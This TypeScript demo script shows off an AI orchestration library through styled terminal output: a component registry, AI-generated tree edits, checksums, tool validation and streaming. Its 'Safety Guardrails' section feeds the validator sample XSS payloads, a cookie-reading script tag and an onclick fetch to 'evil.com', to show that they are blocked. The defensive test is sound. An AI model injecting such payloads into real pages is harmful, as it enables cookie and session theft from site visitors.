/**
 * AI Orchestration Playbook — Working Demo
 *
 * Lipgloss-inspired terminal output with styled boxes, colors,
 * and visual hierarchy. No API keys needed — everything runs locally.
 *
 * Run: npx tsx src/examples/demo.ts
 */

import { z } from 'zod';
import {
  GenerationPipeline,
  ComponentRegistryImpl,
  ToolRegistry,
  defineTool,
  ValidationPipeline,
  StreamProcessor,
  StreamBuilder,
  computeNodeChecksum,
  type ComponentSchema,
  type NodeDto,
  type NodeChange,
  type DesignTokens,
} from '../index.js';

// ─── Terminal Styling (lipgloss-inspired) ────────────────────────────────────

const c = {
  reset: '\x1b[0m',
  bold: '\x1b[1m',
  dim: '\x1b[2m',
  italic: '\x1b[3m',
  underline: '\x1b[4m',

  // Foreground
  white: '\x1b[97m',
  gray: '\x1b[90m',
  black: '\x1b[30m',
  red: '\x1b[91m',
  green: '\x1b[92m',
  yellow: '\x1b[93m',
  blue: '\x1b[94m',
  magenta: '\x1b[95m',
  cyan: '\x1b[96m',

  // Background
  bgBlue: '\x1b[44m',
  bgMagenta: '\x1b[45m',
  bgGreen: '\x1b[42m',
  bgRed: '\x1b[41m',
  bgYellow: '\x1b[43m',
  bgCyan: '\x1b[46m',
  bgGray: '\x1b[100m',

  // 256 colors for subtle tones
  fg: (n: number) => `\x1b[38;5;${n}m`,
  bg: (n: number) => `\x1b[48;5;${n}m`,
};

// ─── Box Drawing ─────────────────────────────────────────────────────────────

const box = {
  tl: '╭', tr: '╮', bl: '╰', br: '╯',
  h: '─', v: '│',
  thickH: '━', thickV: '┃',
  thickTl: '┏', thickTr: '┓', thickBl: '┗', thickBr: '┛',
};

function renderBox(lines: string[], opts: {
  width?: number;
  borderColor?: string;
  title?: string;
  titleColor?: string;
  padding?: number;
  thick?: boolean;
} = {}): string {
  const {
    width = 72,
    borderColor = c.fg(240),
    title,
    titleColor = c.bold + c.white,
    padding = 1,
    thick = false,
  } = opts;

  const tl = thick ? box.thickTl : box.tl;
  const tr = thick ? box.thickTr : box.tr;
  const bl = thick ? box.thickBl : box.bl;
  const br = thick ? box.thickBr : box.br;
  const h = thick ? box.thickH : box.h;
  const v = thick ? box.thickV : box.v;

  const innerW = width - 2;
  const pad = ' '.repeat(padding);
  const emptyLine = `${borderColor}${v}${c.reset}${' '.repeat(innerW)}${borderColor}${v}${c.reset}`;

  const topBorder = title
    ? `${borderColor}${tl}${h}${h} ${titleColor}${title}${c.reset} ${borderColor}${h.repeat(Math.max(0, innerW - title.length - 4))}${tr}${c.reset}`
    : `${borderColor}${tl}${h.repeat(innerW)}${tr}${c.reset}`;

  const bottomBorder = `${borderColor}${bl}${h.repeat(innerW)}${br}${c.reset}`;

  const contentLines = lines.map((line) => {
    // Strip ANSI for length calculation
    const stripped = line.replace(/\x1b\[[0-9;]*m/g, '');
    const available = innerW - padding * 2;

    // Truncate if line is too long
    if (stripped.length > available) {
      // Find the cut point in the original (ANSI-containing) string
      let visibleCount = 0;
      let cutIdx = 0;
      let inEscape = false;
      for (let i = 0; i < line.length; i++) {
        if (line[i] === '\x1b') { inEscape = true; }
        else if (inEscape && /[a-zA-Z]/.test(line[i])) { inEscape = false; }
        else if (!inEscape) {
          visibleCount++;
          if (visibleCount >= available - 1) { cutIdx = i + 1; break; }
        }
      }
      const truncated = line.slice(0, cutIdx) + c.reset + c.dim + '…' + c.reset;
      const truncStripped = stripped.slice(0, available - 1) + '…';
      const padRight2 = Math.max(0, available - truncStripped.length);
      return `${borderColor}${v}${c.reset}${pad}${truncated}${' '.repeat(padRight2)}${pad}${borderColor}${v}${c.reset}`;
    }

    const padRight = Math.max(0, available - stripped.length);
    return `${borderColor}${v}${c.reset}${pad}${line}${' '.repeat(padRight)}${pad}${borderColor}${v}${c.reset}`;
  });

  return [
    topBorder,
    emptyLine,
    ...contentLines,
    emptyLine,
    bottomBorder,
  ].join('\n');
}

function badge(text: string, bgColor: string, fgColor: string = c.black): string {
  return `${bgColor}${fgColor}${c.bold} ${text} ${c.reset}`;
}

function label(text: string, color: string): string {
  return `${color}${c.bold}${text}${c.reset}`;
}

function success(text: string): string {
  return `${c.green}${c.bold}✓${c.reset} ${c.green}${text}${c.reset}`;
}

function fail(text: string): string {
  return `${c.red}${c.bold}✗${c.reset} ${c.red}${text}${c.reset}`;
}

function dimText(text: string): string {
  return `${c.dim}${text}${c.reset}`;
}

function treeProp(key: string, value: string): string {
  return `${c.magenta}${key}${c.reset}${c.dim}=${c.reset}${c.green}"${value}"${c.reset}`;
}

function sectionHeader(num: number, title: string): string {
  const gradient = [c.fg(33), c.fg(39), c.fg(45), c.fg(51), c.fg(87), c.fg(123)];
  const colorIdx = (num - 1) % gradient.length;
  const color = gradient[colorIdx];
  return `\n${color}${c.bold}   ${num}. ${title}${c.reset}\n${color}  ${'▔'.repeat(title.length + 6)}${c.reset}`;
}

// ─── Pretty Tree Printer ─────────────────────────────────────────────────────

function prettyTree(node: NodeDto, indent = 0): string[] {
  const lines: string[] = [];
  const pad = '  '.repeat(indent);
  const connector = indent > 0 ? `${c.dim}├─${c.reset} ` : '';

  // Component name on its own line
  lines.push(`${pad}${connector}${c.cyan}${c.bold}<${node.type}>${c.reset}`);

  // Props on separate indented lines
  if (node.props) {
    const propPad = '  '.repeat(indent + (indent > 0 ? 1 : 0)) + '  ';
    for (const [k, v] of Object.entries(node.props)) {
      lines.push(`${propPad}${treeProp(k, String(v.value))}`);
    }
  }

  if (node.slots) {
    for (const [slotId, children] of Object.entries(node.slots)) {
      lines.push(`${pad}  ${c.dim}└─ slot:${c.reset} ${c.yellow}${slotId}${c.reset}`);
      for (const child of children) {
        lines.push(...prettyTree(child, indent + 2));
      }
    }
  }

  return lines;
}

// ─── Component Schemas ───────────────────────────────────────────────────────

const schemas: ComponentSchema[] = [
  {
    type: 'HeroSection',
    displayName: 'Hero Section',
    description: 'Full-width hero banner with heading, subtext, and CTA',
    category: 'sections',
    tags: ['hero', 'banner', 'landing'],
    props: {
      heading: { type: 'string', required: true, description: 'Main headline' },
      subheading: { type: 'string', description: 'Supporting text' },
      backgroundImage: { type: 'image' },
      alignment: { type: 'enum', enum: ['left', 'center', 'right'], defaultValue: 'center' },
    },
    slots: {
      actions: {
        displayName: 'Action Buttons',
        allowedTypes: ['Button'],
        maxChildren: 3,
      },
    },
  },
  {
    type: 'Card',
    displayName: 'Card',
    description: 'Content card with title, body, and actions',
    category: 'content',
    tags: ['card', 'content'],
    props: {
      title: { type: 'string', required: true },
      body: { type: 'richtext' },
      image: { type: 'image' },
      variant: { type: 'enum', enum: ['default', 'elevated', 'outlined'] },
    },
    slots: {
      footer: {
        displayName: 'Card Footer',
        allowedTypes: ['Button', 'Badge'],
        maxChildren: 3,
      },
    },
  },
  {
    type: 'Grid',
    displayName: 'Grid Layout',
    category: 'layout',
    props: {
      columns: { type: 'number', defaultValue: 3 },
      gap: { type: 'string', defaultValue: '1rem' },
    },
    slots: {
      children: { displayName: 'Grid Items' },
    },
  },
  {
    type: 'Button',
    displayName: 'Button',
    category: 'interactive',
    props: {
      label: { type: 'string', required: true },
      variant: { type: 'enum', enum: ['primary', 'secondary', 'ghost'] },
      size: { type: 'enum', enum: ['sm', 'md', 'lg'] },
    },
  },
  {
    type: 'Badge',
    displayName: 'Badge',
    category: 'content',
    props: {
      text: { type: 'string', required: true },
      color: { type: 'color' },
    },
  },
];

const designTokens: DesignTokens = {
  colors: {
    'brand-primary': '#2563eb',
    'brand-secondary': '#7c3aed',
    'neutral-900': '#171717',
    'neutral-50': '#fafafa',
  },
  spacing: { sm: '0.5rem', md: '1rem', lg: '1.5rem', xl: '2rem' },
  typography: {
    'heading-xl': { fontFamily: 'Inter', fontSize: '3rem', fontWeight: '800', lineHeight: '1.1' },
    body: { fontFamily: 'Inter', fontSize: '1rem', fontWeight: '400', lineHeight: '1.6' },
  },
};

// ─── Terminal Width ───────────────────────────────────────────────────────────

const W = Math.min(process.stdout.columns || 100, 120) - 2; // auto-detect, fallback 100, cap 118

// ─── The Demo ────────────────────────────────────────────────────────────────

async function main() {
  // ─── Title ───────────────────────────────────────────────────────────
  console.log();
  console.log(renderBox(
    [
      `${c.bold}${c.white}AI Orchestration Playbook${c.reset}`,
      `${c.dim}Production patterns for schema-safe AI generation${c.reset}`,
      '',
      `${badge('TypeScript', c.bgBlue)}  ${badge('Zod', c.bgMagenta)}  ${badge('Zero API Keys', c.bgGreen)}`,
    ],
    { width: W, borderColor: c.fg(33), title: '◆ DEMO', titleColor: c.bold + c.fg(33), thick: true }
  ));

  // ═══════════════════════════════════════════════════════════════════════
  // PART 1: Schema Registry
  // ═══════════════════════════════════════════════════════════════════════

  console.log(sectionHeader(1, 'Schema Registry'));

  const registry = new ComponentRegistryImpl();
  registry.registerAll(schemas);
  registry.setDesignTokens(designTokens);
  registry.setConstraints({ maxDepth: 5, maxChildren: 10, stylePolicy: 'tailwind' });

  const schemaContext = registry.toContext();

  const schemaLines: string[] = [
    `${c.dim}What the AI sees in its system prompt:${c.reset}`,
    '',
  ];

  for (const comp of schemaContext.components) {
    const props = Object.keys(comp.props).map((p) => `${c.fg(245)}${p}${c.reset}`).join(c.dim + ', ' + c.reset);
    const slots = comp.slots?.length
      ? `  ${c.dim}→${c.reset} ${c.yellow}slots: ${comp.slots.join(', ')}${c.reset}`
      : '';
    schemaLines.push(`  ${c.cyan}${c.bold}${comp.type}${c.reset}${c.dim}(${c.reset}${props}${c.dim})${c.reset}${slots}`);
  }

  schemaLines.push('');
  schemaLines.push(success(`${schemas.length} schemas registered, Zod-validated`));

  console.log('\n' + renderBox(schemaLines, { width: W, borderColor: c.fg(33) }));

  // ═══════════════════════════════════════════════════════════════════════
  // PART 2: Generate & Apply Changes
  // ═══════════════════════════════════════════════════════════════════════

  console.log(sectionHeader(2, 'Generate & Apply Changes'));

  const existingTree: NodeDto = {
    uid: 'page_root',
    type: 'HeroSection',
    props: {
      heading: { type: 'static', value: 'Welcome to Our Platform' },
      subheading: { type: 'static', value: 'Build amazing experiences' },
      alignment: { type: 'static', value: 'center' },
    },
    slots: {
      actions: [
        {
          uid: 'btn_get_started',
          type: 'Button',
          props: {
            label: { type: 'static', value: 'Get Started' },
            variant: { type: 'static', value: 'primary' },
          },
        },
      ],
    },
  };

  console.log('\n' + renderBox(
    [
      label('BEFORE', c.fg(208)),
      dimText('Current page tree state:'),
      '',
      ...prettyTree(existingTree),
    ],
    { width: W, borderColor: c.fg(208) }
  ));

  const aiGeneratedChanges: NodeChange[] = [
    {
      operation: 'add',
      parentUid: 'page_root',
      slotId: 'actions',
      index: 1,
      node: {
        uid: 'btn_learn_more',
        type: 'Button',
        props: {
          label: { type: 'static', value: 'Learn More' },
          variant: { type: 'static', value: 'secondary' },
        },
      },
    },
    {
      operation: 'modify',
      targetUid: 'page_root',
      props: {
        heading: { type: 'static', value: 'Ship AI Products, Not Prototypes' },
        subheading: { type: 'static', value: 'Production-grade patterns for composable AI systems' },
      },
    },
  ];

  // Changes box
  console.log('\n' + renderBox(
    [
      label('AI OUTPUT', c.fg(141)),
      dimText('Simulated LLM response (2 changes):'),
      '',
      `  ${badge('ADD', c.bgGreen)} ${c.white}Button${c.reset} ${dimText('"Learn More" → actions slot')}`,
      `  ${badge('MOD', c.bgYellow)} ${c.white}HeroSection${c.reset} ${dimText('→ new heading + subheading')}`,
    ],
    { width: W, borderColor: c.fg(141) }
  ));

  const validation = new ValidationPipeline();
  const validationResult = await validation.validateChanges(aiGeneratedChanges, schemaContext, existingTree);

  const pipeline = new GenerationPipeline({
    model: { provider: 'openai', model: 'gpt-4o' },
    providers: {},
  });
  pipeline.schema.registerAll(schemas);

  const updatedTree = pipeline.applyChanges(existingTree, aiGeneratedChanges);

  console.log('\n' + renderBox(
    [
      label('AFTER', c.green),
      `${success('Validated')} ${dimText(`(${validationResult.errors.length} errors, ${validationResult.warnings.length} warnings)`)}`,
      '',
      ...prettyTree(updatedTree),
    ],
    { width: W, borderColor: c.fg(34) }
  ));

  // ═══════════════════════════════════════════════════════════════════════
  // PART 3: Safety Guardrails
  // ═══════════════════════════════════════════════════════════════════════

  console.log(sectionHeader(3, 'Safety Guardrails'));

  const attackChanges: NodeChange[] = [
    {
      operation: 'add',
      parentUid: 'page_root',
      slotId: 'actions',
      node: {
        uid: 'evil_1',
        type: 'Card',
        props: { title: { type: 'static', value: '<script>document.cookie</script>' } },
      },
    },
    {
      operation: 'add',
      parentUid: 'page_root',
      slotId: 'actions',
      node: {
        uid: 'evil_2',
        type: 'FakeWidget',
        props: {},
      },
    },
    {
      operation: 'add',
      parentUid: 'page_root',
      slotId: 'actions',
      node: {
        uid: 'evil_3',
        type: 'Card',
        props: { title: { type: 'static', value: 'onclick=fetch("https://evil.com")' } },
      },
    },
  ];

  const attackResult = await validation.validateChanges(attackChanges, schemaContext, existingTree);

  const guardLines: string[] = [
    label('ATTACK SIMULATION', c.red),
    dimText('3 malicious changes submitted to the validation pipeline:'),
    '',
    `  ${badge('XSS', c.bgRed, c.white)}  ${c.dim}<script>document.cookie</script>${c.reset}`,
    `  ${badge('FAKE', c.bgRed, c.white)}  ${c.dim}Unknown component "FakeWidget"${c.reset}`,
    `  ${badge('EVENT', c.bgRed, c.white)}  ${c.dim}onclick=fetch("https://evil.com")${c.reset}`,
    '',
  ];

  if (!attackResult.valid) {
    guardLines.push(`${c.green}${c.bold}┃${c.reset} ${success(`ALL ${attackResult.errors.length} BLOCKED`)}`);
    guardLines.push(`${c.green}${c.bold}┃${c.reset}`);
    for (const err of attackResult.errors) {
      const code = err.code === 'GUARDRAIL_VIOLATION' ? badge('GUARD', c.bgRed, c.white)
        : err.code === 'UNKNOWN_COMPONENT_TYPE' ? badge('SCHEMA', c.bgYellow)
        : badge(err.code, c.bgGray, c.white);
      guardLines.push(`${c.green}${c.bold}┃${c.reset}  ${code} ${c.dim}${err.message.slice(0, 50)}${c.reset}`);
    }
  }

  console.log('\n' + renderBox(guardLines, { width: W, borderColor: c.red }));

  // ═══════════════════════════════════════════════════════════════════════
  // PART 4: Checksum Verification
  // ═══════════════════════════════════════════════════════════════════════

  console.log(sectionHeader(4, 'Checksum Verification'));

  const checksumBefore = computeNodeChecksum(existingTree);
  const checksumAfter = computeNodeChecksum(updatedTree);

  console.log('\n' + renderBox(
    [
      label('SHA-256 STATE TRACKING', c.fg(220)),
      '',
      `  ${c.dim}Before:${c.reset}  ${c.fg(245)}${checksumBefore}${c.reset}`,
      `  ${c.dim}After:${c.reset}   ${c.fg(245)}${checksumAfter}${c.reset}`,
      '',
      checksumBefore !== checksumAfter
        ? success('Drift detected — tree was modified between generation start and apply')
        : fail('No drift detected'),
    ],
    { width: W, borderColor: c.fg(220) }
  ));

  // ═══════════════════════════════════════════════════════════════════════
  // PART 5: Tool Execution
  // ═══════════════════════════════════════════════════════════════════════

  console.log(sectionHeader(5, 'Tool Execution'));

  const logger = { debug: () => {}, info: () => {}, warn: () => {}, error: () => {} };
  const toolRegistry = new ToolRegistry(logger);

  const addTool = defineTool({
    name: 'math.add',
    description: 'Add two numbers',
    inputSchema: z.object({ a: z.number(), b: z.number() }),
    outputSchema: z.object({ result: z.number() }),
    execute: async (input) => ({ result: input.a + input.b }),
  });

  toolRegistry.register(addTool);

  const toolLines: string[] = [
    label('ZOD-VALIDATED TOOL I/O', c.fg(141)),
    '',
  ];

  // Valid call
  const toolResult = await toolRegistry.execute(
    'math.add', { a: 40, b: 2 },
    { requestId: 'demo', conversationId: 'demo', logger }
  );
  toolLines.push(`  ${badge('OK', c.bgGreen)} ${c.white}math.add(40, 2)${c.reset} ${c.dim}→${c.reset} ${c.bold}${c.green}${(toolResult as { result: number }).result}${c.reset}`);

  // Bad input
  try {
    await toolRegistry.execute(
      'math.add', { a: 'not a number', b: 2 },
      { requestId: 'demo', conversationId: 'demo', logger }
    );
  } catch {
    toolLines.push(`  ${badge('REJECT', c.bgRed, c.white)} ${c.white}math.add("not a number", 2)${c.reset} ${c.dim}→${c.reset} ${c.red}Zod validation failed${c.reset}`);
  }

  // Unknown tool
  try {
    await toolRegistry.execute(
      'nonexistent', {},
      { requestId: 'demo', conversationId: 'demo', logger }
    );
  } catch {
    toolLines.push(`  ${badge('REJECT', c.bgRed, c.white)} ${c.white}nonexistent()${c.reset} ${c.dim}→${c.reset} ${c.red}ToolNotFoundError${c.reset}`);
  }

  toolLines.push('');
  toolLines.push(dimText('Every tool call validates input AND output with Zod schemas'));

  console.log('\n' + renderBox(toolLines, { width: W, borderColor: c.fg(141) }));

  // ═══════════════════════════════════════════════════════════════════════
  // PART 6: Streaming
  // ═══════════════════════════════════════════════════════════════════════

  console.log(sectionHeader(6, 'Streaming Pipeline'));

  const streamBuilder = new StreamBuilder();
  const processor = new StreamProcessor({ onEvent: () => {} });

  async function* simulateStream() {
    const words = 'Adding a grid with 3 pricing cards below the hero section'.split(' ');
    let accumulated = '';
    for (const word of words) {
      accumulated += (accumulated ? ' ' : '') + word;
      yield streamBuilder.createTextEvent(
        (accumulated.length > word.length ? ' ' : '') + word,
        accumulated
      );
      await new Promise((r) => setTimeout(r, 30));
    }
    yield streamBuilder.createToolStartEvent('t1', 'inspect_tree', { rootUid: 'page_root' });
    yield streamBuilder.createToolResultEvent('t1', { nodeCount: 3 });
    yield streamBuilder.createDoneEvent(
      { promptTokens: 210, completionTokens: 145, totalTokens: 355 },
      1840
    );
  }

  const summary = await processor.processAsyncGenerator(simulateStream());

  const streamLines: string[] = [
    label('TYPED EVENT STREAM', c.fg(87)),
    dimText('NDJSON / SSE with backpressure support'),
    '',
    `  ${badge('TEXT', c.bgBlue)} ${c.white}"${processor.getAccumulatedText()}"${c.reset}`,
    `  ${badge('TOOL', c.bgMagenta)} ${c.white}inspect_tree${c.reset} ${c.dim}→ {nodeCount: 3}${c.reset}`,
    `  ${badge('DONE', c.bgGreen)} ${c.white}${summary.totalEvents} events${c.reset} ${c.dim}in ${summary.duration}ms${c.reset}`,
    '',
    dimText(`Token usage: 210 prompt + 145 completion = 355 total`),
  ];

  console.log('\n' + renderBox(streamLines, { width: W, borderColor: c.fg(87) }));

  // ═══════════════════════════════════════════════════════════════════════
  // Summary
  // ═══════════════════════════════════════════════════════════════════════

  console.log();
  console.log(renderBox(
    [
      `${c.bold}${c.green}All 6 patterns demonstrated with real execution${c.reset}`,
      '',
      `  ${c.green}●${c.reset} Schema Registry       ${c.dim}— constrain AI to registered components${c.reset}`,
      `  ${c.green}●${c.reset} Tree Transformation   ${c.dim}— immutable add/modify/remove/move${c.reset}`,
      `  ${c.green}●${c.reset} Safety Guardrails     ${c.dim}— 4 validation layers, XSS blocked${c.reset}`,
      `  ${c.green}●${c.reset} Checksum Verification ${c.dim}— SHA-256 state drift detection${c.reset}`,
      `  ${c.green}●${c.reset} Tool Execution        ${c.dim}— Zod-validated I/O, retry, abort${c.reset}`,
      `  ${c.green}●${c.reset} Streaming Pipeline    ${c.dim}— typed events, backpressure, SSE${c.reset}`,
    ],
    { width: W, borderColor: c.green, title: '◆ COMPLETE', titleColor: c.bold + c.green, thick: true }
  ));

  console.log(`\n  ${c.dim}Ankita Dodamani — github.com/D-Ankita${c.reset}\n`);
}

main().catch(console.error);
